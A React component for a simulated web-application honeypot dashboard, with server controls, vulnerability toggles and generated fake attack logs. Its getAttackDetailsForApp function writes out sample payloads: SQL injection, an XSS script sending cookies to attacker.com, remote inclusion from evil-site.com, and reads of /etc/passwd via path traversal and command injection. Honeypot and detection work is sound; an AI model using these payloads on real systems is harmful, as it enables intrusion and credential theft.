
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Switch } from '@/components/ui/switch';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/components/ui/use-toast';
import { ScrollArea } from '@/components/ui/scroll-area';
import { ArrowLeft, Play, Square, Database, Server, ShieldAlert, Bug, Code } from 'lucide-react';
import { Link } from 'react-router-dom';
import { HoneypotController } from '@/components/HoneypotController';
import { WebAppSelector } from '@/components/WebAppSelector';
import { VulnerabilityEmulator } from '@/services/VulnerabilityEmulator';
import { webAppTemplates } from '@/models/WebAppTemplate';

const HoneypotServer = () => {
  const [serverStatus, setServerStatus] = useState<'stopped' | 'running'>('stopped');
  const [port, setPort] = useState('80');
  const [logLevel, setLogLevel] = useState('info');
  const [logs, setLogs] = useState<string[]>([]);
  const [selectedAppId, setSelectedAppId] = useState('wordpress');
  
  // Initialize vulnerability emulator with the selected web app
  const [vulnerabilityEmulator, setVulnerabilityEmulator] = useState(() => {
    const initialApp = webAppTemplates.find(app => app.id === 'wordpress') || webAppTemplates[0];
    return new VulnerabilityEmulator(initialApp);
  });
  
  // Add state for vulnerability toggles
  const [sqlInjection, setSqlInjection] = useState(true);
  const [xss, setXss] = useState(true);
  const [rfi, setRfi] = useState(true);
  const [lfi, setLfi] = useState(true);
  const [commandInjection, setCommandInjection] = useState(false);
  const [csrf, setCsrf] = useState(false);
  
  const { toast } = useToast();

  // Update vulnerability emulator when the selected app changes
  useEffect(() => {
    const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
    if (selectedApp) {
      const newEmulator = new VulnerabilityEmulator(selectedApp);
      setVulnerabilityEmulator(newEmulator);
      
      // Update vulnerability toggles based on the selected app's profile
      setSqlInjection(selectedApp.vulnerabilityProfile.sql);
      setXss(selectedApp.vulnerabilityProfile.xss);
      setRfi(selectedApp.vulnerabilityProfile.rfi);
      setLfi(selectedApp.vulnerabilityProfile.lfi);
      setCommandInjection(selectedApp.vulnerabilityProfile.commandInjection);
      setCsrf(selectedApp.vulnerabilityProfile.csrf);
      
      // Add log entry for changing the application template
      setLogs(prev => [
        `[${new Date().toISOString()}] [INFO] Switching to ${selectedApp.name} application template`,
        `[${new Date().toISOString()}] [INFO] Loading ${selectedApp.name} vulnerability profile`,
        ...prev
      ]);
      
      toast({
        title: "Application Template Changed",
        description: `Now emulating ${selectedApp.name} with corresponding vulnerabilities`,
      });
    }
  }, [selectedAppId, toast]);

  useEffect(() => {
    // Initialize logs with the selected app info
    const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
    setLogs([
      `[INFO] Honeypot server initialized for ${selectedApp?.name || 'Generic Application'}`,
      `[INFO] Available vulnerability modules based on ${selectedApp?.name || 'application'} profile`,
      `[INFO] Ready to start on port ${port}`
    ]);
  }, [port, selectedAppId]);

  const startServer = () => {
    const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
    setServerStatus('running');
    setLogs(prev => [
      `[${new Date().toISOString()}] [INFO] Starting honeypot server on port ${port}`,
      `[${new Date().toISOString()}] [INFO] Emulating ${selectedApp?.name || 'Generic Application'} version ${selectedApp?.versions[0].version || '1.0.0'}`,
      `[${new Date().toISOString()}] [INFO] Loading vulnerability modules specific to ${selectedApp?.name || 'this application'}`,
      `[${new Date().toISOString()}] [INFO] Server started successfully`,
      ...prev
    ]);
    toast({
      title: "Honeypot Server Started",
      description: `Server is now running on port ${port} emulating ${selectedApp?.name || 'Generic Application'}`,
    });
  };

  const stopServer = () => {
    setServerStatus('stopped');
    setLogs(prev => [
      `[${new Date().toISOString()}] [INFO] Stopping honeypot server`,
      `[${new Date().toISOString()}] [INFO] Saving collected attack data`,
      `[${new Date().toISOString()}] [INFO] Server stopped successfully`,
      ...prev
    ]);
    toast({
      title: "Honeypot Server Stopped",
      description: "Server has been shut down",
    });
  };

  // Simulate receiving an attack periodically when the server is running
  useEffect(() => {
    if (serverStatus !== 'running') return;
    
    const interval = setInterval(() => {
      const selectedApp = webAppTemplates.find(app => app.id === selectedAppId);
      if (!selectedApp) return;
      
      // Generate app-specific attack paths
      const appPaths = selectedApp.commonUrls;
      const randomPath = appPaths[Math.floor(Math.random() * appPaths.length)];
      
      // Generate attack types based on enabled vulnerabilities
      const enabledVulnerabilities = [
        sqlInjection && 'SQL Injection',
        xss && 'Cross-Site Scripting (XSS)',
        rfi && 'Remote File Inclusion',
        lfi && 'Local File Inclusion',
        commandInjection && 'Command Injection',
        csrf && 'CSRF Vulnerabilities',
      ].filter(Boolean) as string[];
      
      if (enabledVulnerabilities.length === 0) return;
      
      const randomAttackType = enabledVulnerabilities[Math.floor(Math.random() * enabledVulnerabilities.length)];
      const randomIP = `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
      
      // Generate app-specific log entries
      const attackDetails = getAttackDetailsForApp(randomAttackType, selectedApp.name, randomPath);
      
      setLogs(prev => [
        `[${new Date().toISOString()}] [ALERT] Detected ${randomAttackType} attempt on ${selectedApp.name} at ${randomPath} from ${randomIP}`,
        `[${new Date().toISOString()}] [INFO] Payload: ${attackDetails}`,
        `[${new Date().toISOString()}] [INFO] Response sent with appropriate emulation`,
        ...prev
      ]);
    }, 5000 + Math.random() * 10000); // Random interval between 5-15 seconds
    
    return () => clearInterval(interval);
  }, [serverStatus, selectedAppId, sqlInjection, xss, rfi, lfi, commandInjection, csrf]);

  // Generate realistic attack details based on app type and vulnerability
  const getAttackDetailsForApp = (attackType: string, appName: string, path: string): string => {
    if (attackType === 'SQL Injection') {
      if (appName === 'WordPress') return `${path}?id=1' OR 1=1 -- -`;
      if (appName === 'PHPMyAdmin') return `${path}?sql_query=SELECT * FROM users WHERE 1=1;`;
      if (appName === 'E-commerce') return `${path}?product_id=1' UNION SELECT username,password FROM users -- -`;
    } else if (attackType === 'Cross-Site Scripting (XSS)') {
      if (appName === 'WordPress') return `${path} with comment containing <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>`;
      if (appName === 'E-commerce') return `${path}?search=<img src="x" onerror="alert(document.cookie)">`;
    } else if (attackType === 'Remote File Inclusion') {
      return `${path}?template=http://evil-site.com/malicious.php`;
    } else if (attackType === 'Local File Inclusion') {
      return `${path}?include=../../../etc/passwd`;
    } else if (attackType === 'Command Injection') {
      return `${path}?cmd=ping -c 4 8.8.8.8; cat /etc/passwd`;
    } else if (attackType === 'CSRF Vulnerabilities') {
      return `POST ${path} with forged form submission from external site`;
    }
    
    return `${path} with malicious payload`;
  };

  // Handle vulnerability toggle changes
  const handleVulnerabilityToggle = (type: string, value: boolean) => {
    const vulnerabilityMap: Record<string, () => void> = {
      'SQL Injection': () => setSqlInjection(value),
      'Cross-Site Scripting (XSS)': () => setXss(value),
      'Remote File Inclusion': () => setRfi(value),
      'Local File Inclusion': () => setLfi(value),
      'Command Injection': () => setCommandInjection(value),
      'CSRF Vulnerabilities': () => setCsrf(value),
    };
    
    const handler = vulnerabilityMap[type];
    if (handler) {
      handler();
      
      // Update the vulnerability emulator
      vulnerabilityEmulator.setVulnerabilityEnabled(type, value);
      
      // Add a log entry when a vulnerability is toggled
      setLogs(prev => [
        `[${new Date().toISOString()}] [INFO] ${type} vulnerability emulation ${value ? 'enabled' : 'disabled'}`,
        ...prev
      ]);
      
      toast({
        title: `${type} ${value ? 'Enabled' : 'Disabled'}`,
        description: `${type} vulnerability emulation has been ${value ? 'enabled' : 'disabled'}`,
      });
    }
  };

  // Handle web app template selection
  const handleSelectApp = (appId: string) => {
    setSelectedAppId(appId);
  };

  return (
    <div className="container mx-auto px-4 py-8 max-w-7xl">
      <header className="mb-8">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Link to="/" className="text-honeypot-glow hover:text-honeypot-glow/80">
              <ArrowLeft className="h-5 w-5" />
            </Link>
            <h1 className="text-3xl font-bold text-honeypot-glow">Web App Honeypot</h1>
            <Badge 
              variant={serverStatus === 'running' ? 'default' : 'outline'} 
              className={serverStatus === 'running' 
                ? 'bg-honeypot-glow text-black' 
                : 'border-honeypot-glow/50 text-honeypot-glow/70'
              }
            >
              {serverStatus === 'running' ? 'RUNNING' : 'OFFLINE'}
            </Badge>
          </div>
        </div>
        <p className="text-gray-400 mt-1">
          Customizable Web Application Honeypot - Emulates vulnerabilities for specific web applications
        </p>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-6">
        <div className="col-span-1">
          <Card className="bg-honeypot-darker border-gray-800">
            <CardHeader className="pb-2">
              <CardTitle className="text-lg flex items-center gap-2">
                <Server className="h-5 w-5 text-honeypot-glow" />
                Server Control
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm text-gray-400">Port</label>
                <Input
                  type="text"
                  value={port}
                  onChange={(e) => setPort(e.target.value)}
                  className="bg-gray-900 border-gray-700 focus:border-honeypot-glow"
                  placeholder="80"
                />
              </div>
              
              <div className="space-y-2">
                <label className="text-sm text-gray-400">Log Level</label>
                <Select value={logLevel} onValueChange={setLogLevel}>
                  <SelectTrigger className="bg-gray-900 border-gray-700 focus:border-honeypot-glow">
                    <SelectValue placeholder="Select Log Level" />
                  </SelectTrigger>
                  <SelectContent className="bg-gray-900 border-gray-700">
                    <SelectItem value="debug">Debug</SelectItem>
                    <SelectItem value="info">Info</SelectItem>
                    <SelectItem value="warning">Warning</SelectItem>
                    <SelectItem value="error">Error</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              
              <div className="space-y-4 pt-4">
                {serverStatus === 'stopped' ? (
                  <Button 
                    className="w-full bg-honeypot-glow text-black hover:bg-honeypot-glow/80 font-bold"
                    onClick={startServer}
                  >
                    <Play className="h-4 w-4 mr-2" />
                    Start Honeypot Server
                  </Button>
                ) : (
                  <Button 
                    variant="destructive" 
                    className="w-full font-bold"
                    onClick={stopServer}
                  >
                    <Square className="h-4 w-4 mr-2" />
                    Stop Honeypot Server
                  </Button>
                )}
              </div>
            </CardContent>
          </Card>
          
          <div className="mt-6">
            <WebAppSelector 
              selectedAppId={selectedAppId} 
              onSelectApp={handleSelectApp} 
            />
          </div>
          
          <div className="mt-6">
            <HoneypotController />
          </div>
        </div>
        
        <div className="col-span-1 lg:col-span-2">
          <Tabs defaultValue="logs" className="w-full">
            <TabsList className="bg-gray-900 border border-gray-800">
              <TabsTrigger value="logs" className="data-[state=active]:bg-honeypot-terminal data-[state=active]:text-honeypot-glow">
                <Code className="h-4 w-4 mr-2" />
                Server Logs
              </TabsTrigger>
              <TabsTrigger value="attacks" className="data-[state=active]:bg-honeypot-terminal data-[state=active]:text-honeypot-glow">
                <Bug className="h-4 w-4 mr-2" />
                Attack Analysis
              </TabsTrigger>
              <TabsTrigger value="vulnerabilities" className="data-[state=active]:bg-honeypot-terminal data-[state=active]:text-honeypot-glow">
                <ShieldAlert className="h-4 w-4 mr-2" />
                Vulnerabilities
              </TabsTrigger>
            </TabsList>
            
            <TabsContent value="logs" className="mt-4">
              <Card className="bg-honeypot-darker border-gray-800">
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Code className="h-5 w-5 text-honeypot-glow" />
                    Live Server Logs
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="terminal-window h-[400px]">
                    {logs.map((log, index) => (
                      <div key={index} className="terminal-line">
                        <code 
                          className={
                            log.includes('[ALERT]') 
                              ? 'text-honeypot-alert' 
                              : log.includes('[ERROR]') 
                                ? 'text-red-400' 
                                : log.includes('[WARNING]') 
                                  ? 'text-honeypot-warning' 
                                  : 'text-honeypot-glow/70'
                          }
                        >
                          {log}
                        </code>
                      </div>
                    ))}
                    {serverStatus === 'running' && (
                      <div className="terminal-line">
                        <span className="text-honeypot-glow/70">$ _</span>
                        <span className="terminal-cursor"></span>
                      </div>
                    )}
                  </ScrollArea>
                </CardContent>
              </Card>
            </TabsContent>
            
            <TabsContent value="attacks" className="mt-4">
              <Card className="bg-honeypot-darker border-gray-800">
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Bug className="h-5 w-5 text-honeypot-glow" />
                    Attack Analysis
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="h-[400px] flex items-center justify-center text-gray-500">
                    {serverStatus === 'running' ? (
                      <p>Collecting and analyzing attack data for {webAppTemplates.find(app => app.id === selectedAppId)?.name || 'selected application'}.</p>
                    ) : (
                      <p>Start the honeypot server to begin collecting attack data.</p>
                    )}
                  </div>
                </CardContent>
              </Card>
            </TabsContent>
            
            <TabsContent value="vulnerabilities" className="mt-4">
              <Card className="bg-honeypot-darker border-gray-800">
                <CardHeader className="pb-2">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <ShieldAlert className="h-5 w-5 text-honeypot-glow" />
                    Emulated Vulnerabilities
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {[
                      { name: 'SQL Injection', active: sqlInjection, description: 'Emulates vulnerable SQL queries' },
                      { name: 'Cross-Site Scripting (XSS)', active: xss, description: 'Responds to XSS injection attempts' },
                      { name: 'Remote File Inclusion', active: rfi, description: 'Simulates RFI vulnerabilities' },
                      { name: 'Local File Inclusion', active: lfi, description: 'Emulates LFI vulnerabilities' },
                      { name: 'Command Injection', active: commandInjection, description: 'Handles OS command injection attempts' },
                      { name: 'CSRF Vulnerabilities', active: csrf, description: 'Exposes fake CSRF endpoints' },
                    ].map((vuln, index) => (
                      <div 
                        key={index} 
                        className="p-3 bg-gray-900/50 rounded-md border border-gray-800 flex justify-between items-center"
                      >
                        <div>
                          <p className="text-sm text-gray-300">{vuln.name}</p>
                          <p className="text-xs text-gray-500">{vuln.description}</p>
                        </div>
                        <Switch 
                          checked={vuln.active} 
                          onCheckedChange={(checked) => handleVulnerabilityToggle(vuln.name, checked)}
                          className="data-[state=checked]:bg-honeypot-glow"
                        />
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
      
      <footer className="mt-12 text-center text-gray-500 text-sm">
        <p>Web Application Honeypot - For educational and research purposes only.</p>
        <p className="mt-1">Not recommended for production environments.</p>
      </footer>
    </div>
  );
};

export default HoneypotServer;
